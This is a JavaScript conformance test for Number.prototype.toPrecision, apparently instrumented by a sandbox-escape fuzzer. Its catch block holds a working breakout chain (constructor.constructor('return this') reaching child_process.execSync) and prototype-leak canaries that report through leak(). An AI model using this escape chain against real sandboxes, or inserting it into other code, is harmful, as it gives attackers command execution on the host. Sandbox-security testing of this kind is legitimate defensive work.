try {
    assert.sameValue(7 .toPrecision(1), '7');
    assert.sameValue(7 .toPrecision(2), '7.0');
    assert.sameValue(7 .toPrecision(3), '7.00');
    assert.sameValue(7 .toPrecision(19), '7.000000000000000000');
    assert.sameValue(7 .toPrecision(20), '7.0000000000000000000');
    assert.sameValue(7 .toPrecision(21), '7.00000000000000000000');
    assert.sameValue((-7).toPrecision(1), '-7');
    assert.sameValue((-7).toPrecision(2), '-7.0');
    assert.sameValue((-7).toPrecision(3), '-7.00');
    assert.sameValue((-7).toPrecision(19), '-7.000000000000000000');
    assert.sameValue((-7).toPrecision(20), '-7.0000000000000000000');
    assert.sameValue((-7).toPrecision(21), '-7.00000000000000000000');
    assert.sameValue(10 .toPrecision(2), '10');
    assert.sameValue(11 .toPrecision(2), '11');
    assert.sameValue(17 .toPrecision(2), '17');
    assert.sameValue(19 .toPrecision(2), '19');
    assert.sameValue(20 .toPrecision(2), '20');
    assert.sameValue((-10).toPrecision(2), '-10');
    assert.sameValue((-11).toPrecision(2), '-11');
    assert.sameValue((-17).toPrecision(2), '-17');
    assert.sameValue((-19).toPrecision(2), '-19');
    assert.sameValue((-20).toPrecision(2), '-20');
    assert.sameValue(42 .toPrecision(2), '42');
    assert.sameValue((-42).toPrecision(2), '-42');
    assert.sameValue(100 .toPrecision(3), '100');
    assert.sameValue(100 .toPrecision(7), '100.0000');
    assert.sameValue(1000 .toPrecision(7), '1000.000');
    assert.sameValue(10000 .toPrecision(7), '10000.00');
    assert.sameValue(100000 .toPrecision(7), '100000.0');
    assert.sameValue(0.000001.toPrecision(1), '0.000001');
    assert.sameValue(0.000001.toPrecision(2), '0.0000010');
    assert.sameValue(0.000001.toPrecision(3), '0.00000100');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}